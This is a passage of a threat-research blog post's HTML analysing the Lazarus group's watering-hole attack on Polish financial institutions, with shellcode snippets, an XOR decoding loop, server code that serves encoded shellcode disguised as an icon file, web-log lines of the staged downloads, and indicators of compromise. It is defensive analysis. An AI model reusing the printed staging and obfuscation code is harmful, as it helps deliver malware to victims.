   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;oldProtect);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>05</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>((<span style="color: #006699;">void</span>&nbsp;(*)(<span style="color: #006699;">void</span>))(buffer&nbsp;+&nbsp;318))();&nbsp;&nbsp;&nbsp;<span style="color: #008200;">//&nbsp;CALL&nbsp;from&nbsp;the&nbsp;318th&nbsp;byte</span></code>
   </td>
</tr>
</tbody></table>
</div>
<br />
This way, the 2<span style="font-size: 80%; position: relative; top: -0.5em;">nd</span> part of the shellcode downloads a binary from the same gateway script as before. <code>pagenum=3</code> means it's a 3<span style="font-size: 80%; position: relative; top: -0.5em;">rd</span> step &#8211; a step of serving the next chunk of the shellcode.<br />
<br />
To understand the next step we need to go back to the gateway script to see how it processes the <code>pagenum=3</code> request.<br />
<br />
When the script receives a <code>pagenum=3</code> request, it checks the <code>'s'</code> URL parameter ('status'). Initially, this parameter is set to <code>2</code> (<code>'s=2'</code>, as seen in the aforementioned URL embedded into the SWF exploit).<br />
<br />
Thus, the script will read and output the contents of 2 files stored on the web server:<br />
<br />
<div style="background: #f2f2f2; border: solid #a6a6a6 1.0pt; padding: 2pt; text-align: left;">
<div style="background: #f2f2f2; margin-left: 5px;">
<code>files/mark180789172360.ico<br />
files/back283671047171.dat</code></div>
</div>
<br />
The first file is likely a valid ICO file, is 318 bytes in size, and its contents are not encoded (hence the reason why the shellcode skips the first 318 bytes, and only decodes the rest).<br />
<br />
The second file is a 3<span style="font-size: 80%; position: relative; top: -0.5em;">rd</span> chunk of the shellcode, and its contents are encoded.<br />
<br />
In addition to these 2 files, the output is appended with a URL. This time, it will specify <code>pagenum</code> parameter set to <code>3</code>, but the status parameter <code>s</code> will now be set to <code>3</code>. For example, the URL may look like:<br />
<br />
<div style="background: #f2f2f2; border: solid #a6a6a6 1.0pt; padding: 2pt; text-align: left;">
<div style="background: #f2f2f2; margin-left: 5px;">
<code>http://[WEB_SITE]/view.jsp?uid=30304811&amp;pagenum=3&amp;s=3</code></div>
</div>
<br />
The appended URL will then be encoded the same way as the file <code>back283671047171.dat</code>:<br />
<br />
<div style="overflow-x: auto;">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; width: 100%;"><tbody>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>01</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="color: #006699;">for</span> (<span style="color: grey;">int</span> i = 0; i &lt; len + 9; i++)</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>02</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>{</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>03</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 27px;">byte var = b[i];</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>04</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 27px;">byte temp = (byte)((var &gt;&gt; 4) &amp; 0x0F);</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>05</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 27px;">var = (byte)(var ^ temp);</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>06</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 27px;">var = (byte)(var ^ 0xCC);</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>07</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 27px;">b[i] = var;</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>08</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>}</code>
   </td>
</tr>
</tbody></table>
</div>
<br />
This way, the encoded URL becomes an integral part of the 3<span style="font-size: 80%; position: relative; top: -0.5em;">rd</span> part of the shellcode &#8211; same way as the 2<span style="font-size: 80%; position: relative; top: -0.5em;">nd</span> part of the shellcode was appended with a URL.<br />
<br />
Following that, the script serves back a blob that consists of three parts:<br />
<br />
<ul>
<li style="list-style-type: none; text-align: left;">&nbsp;&nbsp;&#8226;&nbsp;&nbsp;<code>files/mark180789172360.ico</code>, not encoded (318 bytes)</li>
<li style="list-style-type: none; text-align: left;">&nbsp;&nbsp;&#8226;&nbsp;&nbsp;<code>files/back283671047171.dat</code>, encoded</li>
<li style="list-style-type: none; text-align: left;">&nbsp;&nbsp;&#8226;&nbsp;&nbsp;download URL, encoded</li>
</ul>
<br />
It is served back as a binary file, disguised as an icon file <code>probg[RANDOM].ico</code>, probably in an attempt to bypass network sniffers (in other words, the encrypted shellcode is served <em>appended</em> to a valid icon file):<br />
<br />
<div style="background: #f2f2f2; border: solid #a6a6a6 1.0pt; padding: 2pt; text-align: left;">
<div style="background: #f2f2f2; margin-left: 5px;">
<code>response.setHeader(<span style="color: blue;">"Accept-Ranges"</span>, <span style="color: blue;">"bytes"</span>);<br />
response.setHeader(<span style="color: blue;">"Content-Length"</span>, String.format(<span style="color: blue;">"%d"</span>, response_len));<br />
response.setHeader(<span style="color: blue;">"Content-Disposition"</span>, <span style="color: blue;">"attachment;filename=\"probg"</span> + rand.nextInt(9000) + 10000 + <span style="color: blue;">".ico\""</span>);<br />
response.setHeader("Content-Type", <span style="color: blue;">"application/octet-stream"</span>);</code></div>
</div>
<br />
Once this 3<span style="font-size: 80%; position: relative; top: -0.5em;">rd</span> part of the shellcode is served back to the shellcode that runs on a client side, it will skip the first 318 bytes, decode the rest and execute it. This will invoke another binary download &#8211; this time identified with the status value of <code>3</code> (<code>'s=3'</code>).<br />
<br />
The new binary is generated by <code>view.jsp</code> script and is almost identical to the 3<span style="font-size: 80%; position: relative; top: -0.5em;">rd</span> part of the shellcode.<br />
<br />
The only difference is that the binary blob consists of these files:<br />
<br />
<div style="background: #f2f2f2; border: solid #a6a6a6 1.0pt; padding: 2pt; text-align: left;">
<div style="background: #f2f2f2; margin-left: 5px;">
<code>files/mark180789172360.ico</code>, not encoded (318 bytes), as before<br />
<code><span style="color: #bb2222;">files/meml102783047891.dat</span></code>, encoded</div>
</div>
<br />
The 2<span style="font-size: 80%; position: relative; top: -0.5em;">nd</span> file is now different, and the URL is no longer appended. The reason why the new binary does not need the URL embedded may be that this binary contains an actual malicious executable, detached, decoded, and executed by the shellcode, thus leading to a full compromise of the victim.<br />
<br />
Indeed, as seen in the web log below, the last GET request with the <code>pagenum=3</code> and <code>s=3</code> parameters is served with a 123,710-byte response &#8211; large enough to accommodate a PE-executable:<br />
<br />
<div style="background: #f2f2f2; border: solid #a6a6a6 1.0pt; padding: 2pt; text-align: left;">
<div style="background: #f2f2f2; margin-left: 5px;">
<code>
"GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1" 200 66148<br />
"POST /[PATH]/view.jsp HTTP/1.1" 200 13991<br />
"GET /[PATH]/view.jsp?uid=30304811&amp;pagenum=3&amp;eid=00000002&amp;s=2&amp;data= HTTP/1.1" 200 4642<br />
"GET /[PATH]/view.jsp?uid=30304811&amp;pagenum=3&amp;s=3 HTTP/1.1" 200 123710</code></div>
</div>
<br />
NOTE: At the time of analysis, the ICO/DAT files were not available. Hence, their contents remains unknown.<br />
<br />
<h5 style="font-size: 20px; margin-bottom: 0px;">
Overall Scheme</h5>
<br />
The following scheme illustrates the steps outlined above:<br />
<br />
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhME6dsJXzCOSviRg2VbIVmjvKOhBIRMzdYURqZhjHvgV4e13TQ7Pkpo5untxgXZEq1SGac9xaUvOR597zjWUOlS-0-6X_WyDBo5WM7k9gMqfiTcxRBEvNzDdbTRiaZqvUkCmq4Dr59GLhY/s1600/schema.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="508" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhME6dsJXzCOSviRg2VbIVmjvKOhBIRMzdYURqZhjHvgV4e13TQ7Pkpo5untxgXZEq1SGac9xaUvOR597zjWUOlS-0-6X_WyDBo5WM7k9gMqfiTcxRBEvNzDdbTRiaZqvUkCmq4Dr59GLhY/s640/schema.png" width="640" /></a></div>
<br />
<h5 style="font-size: 20px; margin-bottom: 0px;">
CONCLUSIONS</h5>
<br />
Here we have analysed further files from the recent watering-hole attacks directed at Polish financial institutions and others. Evidently, the Lazarus group are continuing their campaign targeting banking networks. Their watering-hole mechanism is fairly sophisticated &#8211; its multiple stages are designed to complicate analysis of its malware distribution, and at the same, stay undetected for as long as possible.<br />
<br />
Because of the previously disclosed attribution links, the group are also resorting to some trickery.<br />
<br />
Through reverse-engineering, we can see the use of many Russian words that have been translated incorrectly. In some cases the inaccurate translations have transformed the meaning of the words entirely. This strongly implies that the authors of this attack are not native Russian speakers and, as such, the use of Russian words appears to be a 'false flag'. Clearly the group behind these attacks are evolving their modus operandi in terms of capabilities &#8211; but also it seems they&#8217;re attempting to mislead investigators who might jump to conclusions in terms of attribution.<br />
<br />
<h5 style="font-size: 20px; margin-bottom: 0px;">
APPENDIX A: INDICATORS OF COMPROMISE</h5>
<br />
<div style="overflow-x: auto;">
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse; border: none;">
    <tbody>
<tr>
        <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top">MD5 Hashes</td>
        <td style="border-left: none; border: solid #3d4146 1.0pt; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"><code>9cc6854bc5e217104734043c89dc4ff8</code></td>
    </tr>
<tr>
        <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"></td>
        <td style="border-left: none; border: solid #3d4146 1.0pt; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"><code>9914075cc687bdc352ee136ac6579707</code></td>
    </tr>
<tr>
        <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"></td>
        <td style="border-left: none; border: solid #3d4146 1.0pt; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"><code>e29fe3c181ac9ddbb242688b151f3310</code></td>
    </tr>
<tr>
        <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"></td>
        <td style="border-left: none; border: solid #3d4146 1.0pt; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"><code>9216b29114fb6713ef228370cbfe4045</code></td>
    </tr>
<tr>
        <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"></td>
        <td style="border-left: none; border: solid #3d4146 1.0pt; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"><code>8e32fccd70cec634d13795bcb1da85ff</code></td>
    </tr>
<tr>
        <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"></td>
        <td style="border-left: none; border: solid #3d4146 1.0pt; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"><code>889e320cf66520485e1a0475107d7419</code></td>
    </tr>
<tr>
        <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"></td>
        <td style="border-left: none; border: solid #3d4146 1.0pt; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"><code>6dffcfa68433f886b2e88fd984b4995a</code></td>
    </tr>
<tr>
        <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top">Filenames</td>
        <td style="border-left: none; border: solid #3d4146 1.0pt; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"><code>cambio.swf</code></td>
    </tr>
<tr>
        <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"></td>
        <td style="border-left: none; border: solid #3d4146 1.0pt; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"><code>cambio.xap</code></td>
    </tr>
<tr>
        <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"></td>
        <td style="border-left: none; border: solid #3d4146 1.0pt; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"><code>mark180789172360.ico</code></td>
    </tr>
<tr>
        <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"></td>
        <td style="border-left: none; border: solid #3d4146 1.0pt; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"><code>meml102783047891.dat</code></td>
    </tr>
<tr>
        <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"></td>
        <td style="border-left: none; border: solid #3d4146 1.0pt; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"><code>back283671047171.dat</code></td>
    </tr>
<tr>
        <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top">URLs</td>
        <td style="border-left: none; border: solid #3d4146 1.0pt; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"><code>view.jsp?pagenum=1</code></td>
    </tr>
<tr>
        <td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"></td>
        <td style="border-left: none; border: solid #3d4146 1.0pt; padding: 2pt 8pt 2pt 8pt; vertical-align: middle;" valign="top"><code>view.jsp?uid=</code></td>
    </tr>
</tbody>
</table>
</div>
<div style='clear: both;'></div>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='post-timestamp'>
at
<meta content='https://baesystemsai.blogspot.com/2017/02/lazarus-false-flag-malware.html' itemprop='url'/>
<a class='timestamp-link' href='https://baesystemsai.blogspot.com/2017/02/lazarus-false-flag-malware.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2017-02-20T08:51:00Z'>08:51</abbr></a>
</span>
<span class='reaction-buttons'>
</span>
<span class='star-ratings'>
</span>
<span class='post-comment-link'>
</span>
<span class='post-backlinks post-comment-link'>
</span>
<span class='post-icons'>
<span class='item-control blog-admin pid-1481290122'>
<a href='https://www.blogger.com/post-edit.g?blogID=7345515085838422799&postID=2633799336061422338&from=pencil' title='Edit Post'>
<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
</span>
</div>
<div class='post-footer-line post-footer-line-2'>
<span class='post-labels'>
Labels:
<a href='https://baesystemsai.blogspot.com/search/label/Threat%20Research' rel='tag'>Threat Research</a>
</span>
<br/><span class='post-location'>
</span>
</div>
<div class='post-footer-line post-footer-line-3'>
<div class='post-share-buttons goog-inline-block'>
<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=7345515085838422799&postID=2633799336061422338&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=7345515085838422799&postID=2633799336061422338&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=7345515085838422799&postID=2633799336061422338&target=twitter' target='_blank' title='Share to X'><span class='share-button-link-text'>Share to X</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=7345515085838422799&postID=2633799336061422338&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a>
</div>
</div>
</div>
</div>
<div class='comments' id='comments'>
<a name='comments'></a>
<h4>No comments:</h4>
<div id='Blog1_comments-block-wrapper'>
<dl class='avatar-comment-indent' id='comments-block'>
</dl>
</div>
<p class='comment-footer'>
<div class='comment-form'>
<a name='comment-form'></a>
<h4 id='comment-post-message'>Post a Comment</h4>
<p>
</p>
<a href='https://www.blogger.com/comment/frame/7345515085838422799?po=2633799336061422338&hl=en-GB' id='comment-editor-src'></a>
<iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' width='100%'></iframe>
<!--Can't find substitution for tag [post.friendConnectJs]-->
<script src='https://www.blogger.com/static/v1/jsbin/681870030-comment_from_post_iframe.js' type='text/javascript'></script>
<script type='text/javascript'>
      BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html', '0');
    </script>
</div>
</p>
</div>
</div>

        </div></div>
      
<!--Can't find substitution for tag [adEnd]-->
</div>
<div class='blog-pager' id='blog-pager'>
<a class='home-link' href='https://baesystemsai.blogspot.com/'>Home</a>
<span id='blog-pager-newer-link'>
<a class='blog-pager-newer-link' href='https://baesystemsai.blogspot.com/2017/04/apt10-operation-cloud-hopper_3.html' id='Blog1_blog-pager-newer-link' title='Newer Post'>Newer Post</a>
</span>
<span id='blog-pager-older-link'>
<a class='blog-pager-older-link' href='https://baesystemsai.blogspot.com/2017/02/lazarus-watering-hole-attacks.html' id='Blog1_blog-pager-older-link' title='Older Post'>Older Post</a>
</span>
</div>
<div class='clear'></div>
<div class='post-feeds'>
<div class='feed-links'>
Subscribe to:
<a class='feed-link' href='https://baesystemsai.blogspot.com/feeds/2633799336061422338/comments/default' target='_blank' type='application/atom+xml'>Post Comments (Atom)</a>
</div>
</div>
</div></div>
</div>
<div class='sidebar-wrapper right'>
<div class='sidebar section' id='sidebar'><div class='widget HTML' data-version='1' id='HTML2'>
<h2 class='title'>SUBSCRIBE</h2>
<div class='widget-content'>
<p>Sign up to receive our regular Cyber Threat Bulletin.</p>
<div class="contact-info">
<a href=" http://www.baesystems.com/en/cybersecurity/cyber-threat-bulletin" class="contact-btn">Sign up</a>
</div>
</div>
<div class='clear'></div>
</div><div class='widget PopularPosts' data-version='1' id='PopularPosts1'>
<h2>Popular Posts</h2>
<div class='widget-content popular-posts'>
<ul>
<li>
<div class='item-thumbnail-only'>
<div class='item-thumbnail'>
<a href='https://baesystemsai.blogspot.com/2016/04/two-bytes-to-951m.html' target='_blank'>
<img alt='' border='0' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjedDchK2wsPRnYQ1N8_5fdhoN-gdAZYZgbu44hlHT97ZOw2l9IAWy0bcCpMdf59VvZyfSzQqO4v0Ctlk577QbQdkLDn69ncxK2_h8HDPWxY3zOwvu54D10KvDy_3PAdREEf3dF6lZpiUfZ/w72-h72-p-k-no-nu/scheme1.png'/>
</a>
</div>
<div class='item-title'><a href='https://baesystemsai.blogspot.com/2016/04/two-bytes-to-951m.html'>Two bytes to $951m</a></div>
</div>
<div style='clear: both;'></div>
</li>
<li>
<div class='item-thumbnail-only'>
<div class='item-thumbnail'>
<a href='https://baesystemsai.blogspot.com/2017/10/taiwan-heist-lazarus-tools.html' target='_blank'>
<img alt='' border='0' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhg3s3hYeUw6wZKwmtJ6ZhvxxsBXQ6Y4Sn51fK9cgofB8AJGWKCJJuKbxmGHlBWFRu2nkkaUifMKCDEFGHUYEEa-fMgavskBi94jpSv8lp194wrbgrjjV09R0dO8zOM1yQNOHisRTDhEeo/w72-h72-p-k-no-nu/Timeline.png'/>
</a>
</div>
<div class='item-title'><a href='https://baesystemsai.blogspot.com/2017/10/taiwan-heist-lazarus-tools.html'>Taiwan Heist: Lazarus Tools and Ransomware</a></div>
</div>
<div style='clear: both;'></div>
</li>
<li>
<div class='item-thumbnail-only'>
<div class='item-thumbnail'>
<a href='https://baesystemsai.blogspot.com/2017/02/lazarus-watering-hole-attacks.html' target='_blank'>
<img alt='' border='0' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMzqY9AP7r9TMBFOe-a4OisTN9oIrJk-EpP7MHQSKmSY1CJocMvBWe3XcyocODheWR8bX3_AMIDC3jreQ16j-rvMQI0WFfCB0Ps6UjrZ56p7vYbUoShsHWUqnrYlWqbivMU0wGBTFF0M8/w72-h72-p-k-no-nu/Lazarus_and_watering_hole_attacks_one.png'/>
</a>
</div>
<div class='item-title'><a href='https://baesystemsai.blogspot.com/2017/02/lazarus-watering-hole-attacks.html'>Lazarus & Watering-hole attacks</a></div>
</div>
<div style='clear: both;'></div>
</li>
</ul>
<div class='clear'></div>
</div>
</div><div class='widget HTML' data-version='1' id='HTML1'>
<h2 class='title'>Contact</h2>
<div class='widget-content'>
<p>For further information or to talk to an expert, please contact us.</p>
<div class="contact-info">
<a href="mailto:learn@baesystems.com">learn@baesystems.com</a>
<br/><br/><br/>
<a href="http://www.baesystems.com/en/cybersecurity/contact-us " class="contact-btn">Contact</a>
</div>
</div>
<div class='clear'></div>
</div></div>
</div>
<div class='clear'></div>
</div><!-- END ContentWrapper -->
</div>
<footer>
<nav>
<div class='wrap'>
<div class='footerWrapper'>
<ul class='social-icon-list'>
<li class='twitter-icon'>
<a href='https://twitter.com/baesystems_ai'></a>
</li>
<li class='fb-icon'>
<a href='https://facebook.com/baesystemsappliedintelligence'></a>
</li>
<li class='in-icon'>
<a href='https://linkedin.com/company/baesystemsai'></a>
</li>
<li class='flickr-icon'>
<a href='https://flickr.com/photos/bae_systemsplc'></a>
</li>
<li class='youtube-icon'>
<a href='https://www.youtube.com/user/BAESystemsAI'></a>
</li>
</ul>
</div>
</div>
</nav>
<div class='bottom-bar'>
<div class='wrap'>
<ul class='footerList'>
<li><a href='https://baesystems.com/page/accessibility'>Accessibility</a></li>
<li><a href='https://baesystems.com/page/terms_conditions'>Terms & conditions</a></li>
<li><a href='https://www.baesystems.com/en/bae-systems-privacy-notice'>Privacy</a></li>
<li><a href='https://baesystems.com/page/sitemap'>Sitemap</a></li>
</ul>
<p class='copyright'>&#169; 2015 BAE Systems. All rights reserved</p>
</div>
</div>
</footer>
</div>

<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/1812387825-widgets.js"></script>
<script type='text/javascript'>
window['__wavt'] = 'AOuZoY7ZWoqZAl8FiMjF0yYa86wmjvofKA:1742339768212';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d7345515085838422799','//baesystemsai.blogspot.com/2017/02/lazarus-false-flag-malware.html','7345515085838422799');
_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '7345515085838422799', 'title': 'BAE Systems Threat Research Blog', 'url': 'https://baesystemsai.blogspot.com/2017/02/lazarus-false-flag-malware.html', 'canonicalUrl': 'https://baesystemsai.blogspot.com/2017/02/lazarus-false-flag-malware.html', 'homepageUrl': 'https://baesystemsai.blogspot.com/', 'searchUrl': 'https://baesystemsai.blogspot.com/search', 'canonicalHomepageUrl': 'https://baesystemsai.blogspot.com/', 'blogspotFaviconUrl': 'https://baesystemsai.blogspot.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': false, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'en-GB', 'localeUnderscoreDelimited': 'en_gb', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22BAE Systems Threat Research Blog - Atom\x22 href\x3d\x22https://baesystemsai.blogspot.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22BAE Systems Threat Research Blog - RSS\x22 href\x3d\x22https://baesystemsai.blogspot.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22BAE Systems Threat Research Blog - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/7345515085838422799/posts/default\x22 /\x3e\n\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22BAE Systems Threat Research Blog - Atom\x22 href\x3d\x22https://baesystemsai.blogspot.com/feeds/2633799336061422338/comments/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'boqCommentIframeForm': true, 'loginRedirectParam': '', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/459db401c2dc748e', 'plusOneApiSrc': 'https://apis.google.com/js/platform.js', 'disableGComments': true, 'interstitialAccepted': false, 'sharing': {'platforms': [{'name': 'Get link', 'key': 'link', 'shareMessage': 'Get link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Share to Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'X', 'key': 'twitter', 'shareMessage': 'Share to X', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Share to Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 0, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27en_GB\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': true, 'jumpLinkMessage': 'Read more', 'pageType': 'item', 'postId': '2633799336061422338', 'postImageThumbnailUrl': 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5m4b1zAFAs0v7F5S4K-vCXbP6s-XN4TsFUUDQS6vxCsHPoUyuEIZrLeC9jhGJKwhtXKPk4qPX5yNJifOsd9kTfMAK9F_pqfGdmajKF8Aff-0y3Fshp2sjWwrnF8nCI0D39-KWBz2lOpI/s72-c/client.PNG', 'postImageUrl': 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5m4b1zAFAs0v7F5S4K-vCXbP6s-XN4TsFUUDQS6vxCsHPoUyuEIZrLeC9jhGJKwhtXKPk4qPX5yNJifOsd9kTfMAK9F_pqfGdmajKF8Aff-0y3Fshp2sjWwrnF8nCI0D39-KWBz2lOpI/s640/client.PNG', 'pageName': 'Lazarus\u2019 False Flag Malware', 'pageTitle': 'BAE Systems Threat Research Blog: Lazarus\u2019 False Flag Malware'}}, {'name': 'features', 'data': {}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Link copied to clipboard', 'ok': 'Ok', 'postLink': 'Post link'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'Custom', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': 